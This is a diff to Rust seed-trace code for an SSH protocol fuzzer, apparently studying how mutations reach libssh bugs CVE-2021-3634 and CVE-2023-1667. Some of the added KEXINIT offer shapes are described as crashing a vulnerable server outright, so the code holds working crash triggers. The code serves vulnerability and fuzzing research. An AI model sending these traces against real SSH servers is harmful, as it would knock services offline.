@@ -2319,7 +2319,50 @@ pub fn seed_client_attacker_session_requests(server: AgentName) -> Trace<SshProt
 /// packet before the switch). AES-256-GCM, c2s counter = packet index since the
 /// first NewKeys.
 pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
-    seed_client_attacker_rekey_impl(server, false)
+    seed_client_attacker_rekey_impl(server, false, RekeyKexOffer::CurveOnly)
+}
+
+/// Which KEX algorithm(s) the *rekey* KEXINIT offers, for the CVE-2021-3634 Q5 experiments.
+/// `CurveOnly`/`CurveThenG16` negotiate curve25519 (honest, no crash); the `G16*` shapes force the
+/// server onto the 64-byte-digest group16 re-KEX and so crash as-is — they exist to test exactly
+/// which rekey-kex-list shape a single mutation must reach to trigger.
+#[derive(Clone, Copy, Debug)]
+pub enum RekeyKexOffer {
+    CurveOnly,
+    CurveThenG16,
+    G16ThenCurve,
+    G16G16,
+    G16Only,
+}
+
+/// Diagnostic builder: the honest rekey seed with an arbitrary rekey-kex offer shape.
+pub fn seed_client_attacker_rekey_kex(
+    server: AgentName,
+    rekey_kex: RekeyKexOffer,
+) -> Trace<SshProtocolTypes> {
+    seed_client_attacker_rekey_impl(server, false, rekey_kex)
+}
+
+/// Q5 (CVE-2021-3634) mapper/seed-enrichment experiment — the autonomous-safe realization of
+/// proposed improvement #2. Identical to [`seed_client_attacker_rekey`] except the *rekey* KEXINIT
+/// offers two KEX algorithms, `[curve25519-sha256, diffie-hellman-group16-sha512]`, instead of
+/// curve25519 alone. The server negotiates the client's first offer (curve25519), so the rekey still
+/// completes honestly with a 32-byte digest and the seed does NOT crash as-is — but the vulnerable
+/// `fn_algo_dh_group16_sha512` symbol is now present *inside the trace* as a non-selected fallback.
+///
+/// That one realistic enrichment turns the crash from a single-operator target (only
+/// `ReplaceMatchMutator` could *synthesize* group16) into a THREE-operator, distance-1 target:
+///   - `ReplaceReuseMutator` can now copy the in-trace group16 leaf onto the curve25519 kex leaf
+///     (it draws replacements from within the same trace, so it was previously powerless here);
+///   - `RemoveAndLiftMutator` can drop the curve25519 leaf, leaving the group16 offer alone;
+///   - `ReplaceMatchMutator` can still swap curve25519 -> group16.
+/// Each yields a rekey KEXINIT that negotiates group16 (64-byte digest > the first 32-byte one) and
+/// drives the `ssh_packet_set_newkeys` over-read. Quantified in
+/// `sshpuffin/tests/reachability_cve_2021_3634.rs`. This is the direct analogue of why CVE-2023-1667
+/// is discoverable (its honest seed already carries the `fn_with_first_kex_follows` wrapper, so only
+/// a bool flip remains). Pure `sshpuffin/` seed addition — no `puffin/` mutator change.
+pub fn seed_client_attacker_rekey_g16_fallback(server: AgentName) -> Trace<SshProtocolTypes> {
+    seed_client_attacker_rekey_impl(server, false, RekeyKexOffer::CurveThenG16)
 }
 
 /// CVE-2023-1667 witness variant of [`seed_client_attacker_rekey`]: the client-initiated
@@ -2328,12 +2371,13 @@ pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> 
 /// methods fields; on this post-auth rekey it dereferences a NULL kex-methods pointer and
 /// crashes (CVE-2023-1667). A fixed server (>= 0.10.5) handles the flag and survives.
 pub fn seed_client_attacker_rekey_guess(server: AgentName) -> Trace<SshProtocolTypes> {
-    seed_client_attacker_rekey_impl(server, true)
+    seed_client_attacker_rekey_impl(server, true, RekeyKexOffer::CurveOnly)
 }
 
 fn seed_client_attacker_rekey_impl(
     server: AgentName,
     first_kex_follows: bool,
+    rekey_kex: RekeyKexOffer,
 ) -> Trace<SshProtocolTypes> {
     let server_banner_id =
         term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
@@ -2387,10 +2431,33 @@ fn seed_client_attacker_rekey_impl(
     // that is s2c-encrypted and only flushed when the server processes rekey_newkeys,
     // the same flush/decryption wall documented for the channel-number query. So
     // this seed drives the re-KEX handshake but stops at rekey_newkeys.
+    // Rekey KEX offer, selected by `rekey_kex` (CVE-2021-3634 Q5 experiments). `CurveOnly` and
+    // `CurveThenG16` both negotiate curve25519 (honest completion); the rest force group16 and so
+    // crash as-is (they exist to pin down WHICH list shape a mutation must reach to trigger).
+    let rekey_kex_algos = match rekey_kex {
+        RekeyKexOffer::CurveOnly => {
+            term! { fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256)))) }
+        }
+        RekeyKexOffer::CurveThenG16 => term! {
+            fn_kex_algos((fn_namelist_append(
+                (fn_namelist_1((fn_algo_curve25519_sha256))), (fn_algo_dh_group16_sha512))))
+        },
+        RekeyKexOffer::G16ThenCurve => term! {
+            fn_kex_algos((fn_namelist_append(
+                (fn_namelist_1((fn_algo_dh_group16_sha512))), (fn_algo_curve25519_sha256))))
+        },
+        RekeyKexOffer::G16G16 => term! {
+            fn_kex_algos((fn_namelist_append(
+                (fn_namelist_1((fn_algo_dh_group16_sha512))), (fn_algo_dh_group16_sha512))))
+        },
+        RekeyKexOffer::G16Only => {
+            term! { fn_kex_algos((fn_namelist_1((fn_algo_dh_group16_sha512)))) }
+        }
+    };
     let rekey_kexinit_msg = term! {
         fn_kex_init(
             (fn_cookie_zeros),
-            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
+            (@rekey_kex_algos),
             (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
             (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
             (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
